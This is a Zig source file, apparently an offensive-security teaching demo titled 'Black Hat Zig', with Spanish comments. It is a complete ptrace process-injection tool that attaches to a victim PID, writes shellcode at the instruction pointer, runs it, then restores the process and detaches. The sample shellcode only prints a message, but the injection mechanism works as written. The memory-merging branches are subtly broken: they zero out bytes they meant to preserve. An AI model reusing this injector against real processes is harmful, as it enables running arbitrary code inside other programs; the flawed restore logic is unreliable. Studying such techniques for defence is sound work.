const std = @import("std");
const linux = std.os.linux;

fn checkSyscallResult(ret: u64) !u64 {
    const signed: i64 = @bitCast(ret);
    if (signed < 0) {
        std.debug.print("  [!] Syscall failed with errno: {d}\n", .{-signed});
        return error.SyscallFailed;
    }
    return ret;
}

fn rawWrite(fd: u64, buf: []const u8) !void {
    _ = try checkSyscallResult(linux.syscall3(.write, fd, @intFromPtr(buf.ptr), buf.len));
}

// ptrace operations
const PTRACE_ATTACH: u64 = 16;
const PTRACE_DETACH: u64 = 17;
const PTRACE_GETREGS: u64 = 12;
const PTRACE_SETREGS: u64 = 13;
const PTRACE_POKETEXT: u64 = 4;
const PTRACE_PEEKTEXT: u64 = 1;
const PTRACE_CONT: u64 = 7;

const UserRegs = extern struct {
    r15: u64,
    r14: u64,
    r13: u64,
    r12: u64,
    rbp: u64,
    rbx: u64,
    r11: u64,
    r10: u64,
    r9: u64,
    r8: u64,
    rax: u64,
    rcx: u64,
    rdx: u64,
    rsi: u64,
    rdi: u64,
    orig_rax: u64,
    rip: u64,
    cs: u64,
    eflags: u64,
    rsp: u64,
    ss: u64,
    fs_base: u64,
    gs_base: u64,
    ds: u64,
    es: u64,
    fs: u64,
    gs: u64,
};

fn rawPtrace(request: u64, pid: u64, addr: u64, data: u64) !u64 {
    return try checkSyscallResult(linux.syscall4(
        .ptrace,
        request,
        pid,
        addr,
        data,
    ));
}

fn rawWaitpid(pid: u64) !u32 {
    var status: u32 = 0;
    _ = try checkSyscallResult(linux.syscall4(
        .wait4,
        pid,
        @intFromPtr(&status),
        0,
        0,
    ));
    return status;
}

fn rawKill(pid: u64, sig: u64) !void {
    _ = try checkSyscallResult(linux.syscall2(.kill, pid, sig));
}

pub fn main(init: std.process.Init) !void {
    try rawWrite(1, "\n  [*] Black Hat Zig - ptrace Process Injection\n");
    try rawWrite(1, "  [*] ============================================\n\n");

    // Leer PID del argumento
    const arena = init.arena.allocator();
    const args = try init.minimal.args.toSlice(arena);
    if (args.len < 2) {
        try rawWrite(1, "  Usage: injector <victim_pid>\n\n");
        std.process.exit(1);
    }

    const target_pid: u64 = std.fmt.parseInt(u64, args[1], 10) catch {
        try rawWrite(1, "  [!] Invalid PID\n");
        std.process.exit(1);
    };

    std.debug.print("  [+] Target PID: {d}\n", .{target_pid});

    // Shellcode: write(1, msg, len) + int3 (breakpoint para volver)
    const shellcode = [_]u8{
        // mov eax, 1 (write)
        0xb8, 0x01, 0x00, 0x00, 0x00,
        // mov edi, 1 (stdout)
        0xbf, 0x01, 0x00, 0x00, 0x00,
        // lea rsi, [rip+8]
        0x48, 0x8d, 0x35, 0x08, 0x00,
        0x00, 0x00,
        // mov edx, 47
        0xba, 0x2f, 0x00,
        0x00, 0x00,
        // syscall
        0x0f, 0x05,
        // int3 (trap - devuelve control al tracer)
        0xcc,
        // "\n  [!] INJECTED: code running in victim process!\n"
        0x0a, 0x20, 0x20, 0x5b, 0x21,
        0x5d, 0x20, 0x49, 0x4e, 0x4a,
        0x45, 0x43, 0x54, 0x45, 0x44,
        0x3a, 0x20, 0x63, 0x6f, 0x64,
        0x65, 0x20, 0x72, 0x75, 0x6e,
        0x6e, 0x69, 0x6e, 0x67, 0x20,
        0x69, 0x6e, 0x20, 0x76, 0x69,
        0x63, 0x74, 0x69, 0x6d, 0x20,
        0x70, 0x72, 0x6f, 0x63, 0x65,
        0x73, 0x73, 0x21, 0x0a,
    };

    // Paso 1: ATTACH — nos conectamos al proceso victima
    try rawWrite(1, "\n  [1] PTRACE_ATTACH: attaching to victim...\n");
    _ = try rawPtrace(PTRACE_ATTACH, target_pid, 0, 0);
    const status = try rawWaitpid(target_pid);
    std.debug.print("  [+] Attached! wait status: 0x{x}\n", .{status});

    // Paso 2: GETREGS — leemos los registros actuales
    try rawWrite(1, "  [2] PTRACE_GETREGS: reading victim registers...\n");
    var original_regs: UserRegs = undefined;
    _ = try rawPtrace(PTRACE_GETREGS, target_pid, 0, @intFromPtr(&original_regs));
    std.debug.print("  [+] RIP = 0x{x}\n", .{original_regs.rip});
    std.debug.print("  [+] RSP = 0x{x}\n", .{original_regs.rsp});

    // Paso 3: guardar los bytes originales en la direccion de RIP
    try rawWrite(1, "  [3] Saving original bytes at RIP...\n");
    var saved_bytes: [shellcode.len]u8 = undefined;
    var offset: usize = 0;
    while (offset < shellcode.len) {
        var word: u64 = undefined;
        _ = try rawPtrace(PTRACE_PEEKTEXT, target_pid, original_regs.rip + offset, @intFromPtr(&word));
        const bytes: [8]u8 = @bitCast(word);
        const remaining = shellcode.len - offset;
        const to_copy = @min(remaining, 8);
        @memcpy(saved_bytes[offset..][0..to_copy], bytes[0..to_copy]);
        offset += 8;
    }
    std.debug.print("  [+] Saved {d} bytes\n", .{saved_bytes.len});

    // Paso 4: POKETEXT — escribir shellcode en la memoria de la victima
    try rawWrite(1, "  [4] PTRACE_POKETEXT: injecting shellcode at RIP...\n");
    offset = 0;
    while (offset < shellcode.len) {
        var word: u64 = 0;
        const remaining = shellcode.len - offset;
        if (remaining >= 8) {
            word = @bitCast(shellcode[offset..][0..8].*);
        } else {
            // Ultimo word parcial: leer lo que hay y mezclar
            var existing: u64 = undefined;
            _ = try rawPtrace(PTRACE_PEEKTEXT, target_pid, original_regs.rip + offset, @intFromPtr(&existing));
            var word_bytes: [8]u8 = @bitCast(word);
            @memcpy(word_bytes[0..remaining], shellcode[offset..][0..remaining]);
            word = @bitCast(word_bytes);
        }
        _ = try rawPtrace(PTRACE_POKETEXT, target_pid, original_regs.rip + offset, word);
        offset += 8;
    }
    std.debug.print("  [+] Injected {d} bytes of shellcode\n", .{shellcode.len});

    // Paso 5: CONT — dejar que la victima ejecute (nuestro shellcode)
    try rawWrite(1, "  [5] PTRACE_CONT: resuming victim (executing shellcode)...\n\n");
    _ = try rawPtrace(PTRACE_CONT, target_pid, 0, 0);

    // Esperar a que el shellcode haga int3 (SIGTRAP)
    const trap_status = try rawWaitpid(target_pid);
    std.debug.print("  [+] Victim stopped (SIGTRAP), status: 0x{x}\n", .{trap_status});

    // Paso 6: restaurar bytes originales
    try rawWrite(1, "  [6] Restoring original bytes...\n");
    offset = 0;
    while (offset < saved_bytes.len) {
        var word: u64 = 0;
        const remaining = saved_bytes.len - offset;
        if (remaining >= 8) {
            word = @bitCast(saved_bytes[offset..][0..8].*);
        } else {
            var existing: u64 = undefined;
            _ = try rawPtrace(PTRACE_PEEKTEXT, target_pid, original_regs.rip + offset, @intFromPtr(&existing));
            var word_bytes: [8]u8 = @bitCast(word);
            @memcpy(word_bytes[0..remaining], saved_bytes[offset..][0..remaining]);
            word = @bitCast(word_bytes);
        }
        _ = try rawPtrace(PTRACE_POKETEXT, target_pid, original_regs.rip + offset, word);
        offset += 8;
    }

    // Paso 7: restaurar registros originales
    try rawWrite(1, "  [7] PTRACE_SETREGS: restoring original registers...\n");
    _ = try rawPtrace(PTRACE_SETREGS, target_pid, 0, @intFromPtr(&original_regs));

    // Paso 8: DETACH — desconectarse
    try rawWrite(1, "  [8] PTRACE_DETACH: detaching from victim...\n");
    _ = try rawPtrace(PTRACE_DETACH, target_pid, 0, 0);

    try rawWrite(1, "\n  [+] Injection complete! Victim continues running normally.\n\n");
}
